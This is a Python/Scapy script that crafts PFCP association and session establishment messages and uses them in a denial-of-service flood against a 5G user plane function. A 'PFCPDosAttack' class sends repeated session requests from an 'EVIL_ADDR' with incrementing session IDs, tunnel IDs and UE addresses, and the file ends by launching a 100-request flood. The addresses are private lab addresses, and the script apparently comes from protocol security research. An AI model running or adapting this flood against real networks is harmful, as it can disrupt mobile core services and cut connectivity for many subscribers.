from scapy.all import send, IP, UDP
from scapy.contrib.pfcp import *
import time, random, ipaddress
EVIL_ADDR = "10.100.200.66" 
UPF_ADDR  = "10.100.200.2"
DEST_PORT = 8805
SRC_PORT = 8805
seq=1

class Ez_PFCP:
    def __init__(self, src_addr, dest_addr, src_port=8805, dest_port=8805, verbose=False):
        self.src_addr = src_addr
        self.dest_addr = dest_addr
        self.src_port = src_port
        self.dest_port = dest_port
        self.seq = 1
        self.verbose = verbose
        self.seid=None
        
        if verbose:
            print("[EZ-PFCP] Verbose mode enabled")
        
        
        
    def new_seq(self):
        seq = self.seq
        self.seq += 1
        if self.seq > 0xFFFFFFFF:
            self.seq = 1
        return seq
    
    
    
    def Send_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seq = self.new_seq()
        
        # Trick to bypass scapy's bad parsing
        node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))
        recovery_timestamp = Raw(bytes(IE_RecoveryTimeStamp(
            timestamp=int(time.time())
        )))
        pfcp_msg = PFCP(
            version=1,
            message_type=5,
            seid=0,
            S=0,
            seq=seq
        )/node_id/recovery_timestamp

        packet = IP(src=src_addr, dst=dest_addr)/UDP(sport=src_port, dport=dest_port)/pfcp_msg
        packet = packet.__class__(bytes(packet))
        if self.verbose:
            print(f"[EZ-PFCP] PFCP Association Setup packet:")
            packet.show()
        send(packet)
        if self.verbose:
            print(f"[EZ-PFCP] PFCP Association Setup packet sent")
            
    def Send_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1):
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seid = seid or self.seid
        seq = self.new_seq()
        
        ie_nodeid = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))
        ie_fseid = Raw(bytes(IE_FSEID(seid=seid, v4=1, ipv4=src_addr)))

        ie_createpdr = Raw(bytes(IE_CreatePDR(IE_list=[
            IE_PDR_Id(id=1),
            IE_Precedence(precedence=precedence),
            IE_PDI(IE_list=[
                IE_SourceInterface(interface=interface),
                
                IE_FTEID(TEID=teid, V4=1, ipv4=ue_addr)
            ]),
            IE_FAR_Id(id=1)
        ])))

        ie_createfar = Raw(bytes(IE_CreateFAR(IE_list=[
            
            IE_FAR_Id(id=1),
            IE_ApplyAction(FORW=1)
        ])))

        pfcp_msg = PFCP(
            version=1,
            message_type=50,
            seid=0,
            S=1,
            seq=seq
        ) / ie_nodeid / ie_fseid / ie_createpdr / ie_createfar

        pkt = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / pfcp_msg
        pkt = pkt.__class__(bytes(pkt))  # Recalcul final


        if self.verbose:
            print(f"[EZ-PFCP] Sending PFCP Session Establishment Packet:")
            pkt.show()
        send(pkt)
        if self.verbose:
            print(f"[EZ-PFCP] PFCP Session Establishment Packet sent.")


        
        
        
        
        
        
        
        
        
        




class PFCPDosAttack:
    def __init__(self, evil_addr, upf_addr, src_port, dest_port, ue_start_addr="1.1.1.1"):
        self.evil_addr = evil_addr
        self.upf_addr = upf_addr
        self.src_port = src_port
        self.dest_port = dest_port
        self.seq = 1
        self.seid_counter = 1
        self.teid_counter = 1
        self.ue_base_addr = ipaddress.IPv4Address(ue_start_addr)
        self._ue_counter = 1
        self.verbose = False
        
    def new_ue_addr(self):
        next_ip = self.ue_base_addr + self._ue_counter
        self._ue_counter += 1
        return str(next_ip)
        
    
    def set_verbose(self, verbose=True):
        self.verbose = verbose
        if verbose:
            print("[DoS] Verbose mode enabled")
        else:
            print("[DoS]Verbose mode disabled")
    
    def new_seq(self):
        seq = self.seq
        self.seq += 1
        if self.seq > 0xFFFFFFFF:
            self.seq = 1
        return seq
    
    def new_seid(self):
        seid = self.seid_counter
        self.seid_counter += 1
        if self.seid_counter > 0xFFFFFFFFFFFFFFFF:
            self.seid_counter = 1
        return seid
    
    def new_teid(self):
        teid = self.teid_counter
        self.teid_counter += 1
        if self.teid_counter > 0xFFFFFFFF:
            self.teid_counter = 1
        return teid
    
    def Start_pfcp_session_establishment_flood(self, reqNbr=100):
        if self.verbose:
            print(f"[DoS] Starting PFCP session establishment flood with {reqNbr} requests")
        ezpfcp = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=self.verbose)
        
        for i in range(reqNbr):
            ezpfcp.Send_PFCP_association_setup_req()
            
            ezpfcp.Send_PFCP_session_establishment_req(
                seid=self.new_seid(), 
                ue_addr=self.new_ue_addr(),
                teid=self.new_teid())
            if self.verbose:
                print(f"[DoS] PFCP session establishment request {i+1}/{reqNbr} sent")
        if self.verbose:
            print(f"[DoS] PFCP session establishment flood completed")
    






# Generates a random SEID
def random_seid():
    return random.randint(1, 0xFFFFFFFFFFFFFFFF)

# Send PFCP Association Setup Request
def send_pfcp_association_setup_req():
    global seq
    
    # Trick to bypass scapy's bad parsing
    
    
    node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=EVIL_ADDR)))
    recovery_timestamp = Raw(bytes(IE_RecoveryTimeStamp(
        timestamp=int(time.time())
    )))
    pfcp_msg = PFCP(
        version=1,
        message_type=5,
        seid=0,
        S=0,
        seq=seq
    )/node_id/recovery_timestamp

    packet = IP(src=EVIL_ADDR, dst=UPF_ADDR)/UDP(sport=8805, dport=8805)/pfcp_msg
    packet = packet.__class__(bytes(packet))
    print("PFCP Association Setup packet:", packet.show())
    send(packet)
    print(f"PFCP Association Setup packet sent")
    seq += 1

# Send PFCP Session Establishment Request
def send_pfcp_session_establishment_req(seid=0xC0FFEE):
    global seq
    
    teid = 0x11111111
    ue_ip = "1.1.1.1" # Random IP address


    ie_nodeid = Raw(bytes(IE_NodeId(id_type=0, ipv4=EVIL_ADDR)))
    ie_fseid = Raw(bytes(IE_FSEID(seid=seid, v4=1, ipv4=EVIL_ADDR)))

    ie_createpdr = Raw(bytes(IE_CreatePDR(IE_list=[
        IE_PDR_Id(id=1),
        IE_Precedence(precedence=255),
        IE_PDI(IE_list=[
            IE_SourceInterface(interface=1),
            
            IE_FTEID(TEID=teid, V4=1, ipv4=ue_ip)
        ]),
        IE_FAR_Id(id=1)
    ])))

    ie_createfar = Raw(bytes(IE_CreateFAR(IE_list=[
        IE_FAR_Id(id=1),
        IE_ApplyAction(FORW=1)
    ])))

    pfcp_msg = PFCP(
        version=1,
        message_type=50,
        seid=0,
        S=1,
        seq=seq
    ) / ie_nodeid / ie_fseid / ie_createpdr / ie_createfar

    pkt = IP(src=EVIL_ADDR, dst=UPF_ADDR) / UDP(sport=SRC_PORT, dport=DEST_PORT) / pfcp_msg
    pkt = pkt.__class__(bytes(pkt))  # Recalcul final

    print(f"Sending PFCP Session Establishment Request Test")
    pkt.show()
    send(pkt)
    print("Packet sent.")
    seq += 1




# def session_establishment_flood(reqNbr=100):
#     seid = 1
    
#     for _ in range(reqNbr):
#         send_pfcp_association_setup_req()
        
#         send_pfcp_session_establishment_req(seid=seid)
#         seid += 1
#         if seid > 0xFFFFFFFFFFFFFFFF:  # reset SEID if it exceeds the max val
#             seid = 0
        
        

# session_establishment_flood(reqNbr=100)

# # option 1: (mieux si on veut faire plusieurs requêtes sur le même upf)
# objet_test = Ez_PFCP(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, verbose=True)
# objet_test.Send_PFCP_association_setup_req()
# objet_test.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.1.1")

# # option 2: (plus modulable)
# Ez_PFCP().Send_PFCP_association_setup_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
# Ez_PFCP().Send_PFCP_session_establishment_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 
#                                               seid=0xC0FFEE, ue_addr="1.1.1.1")


pfcp_dos_obj = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
pfcp_dos_obj.set_verbose(True)
pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=100)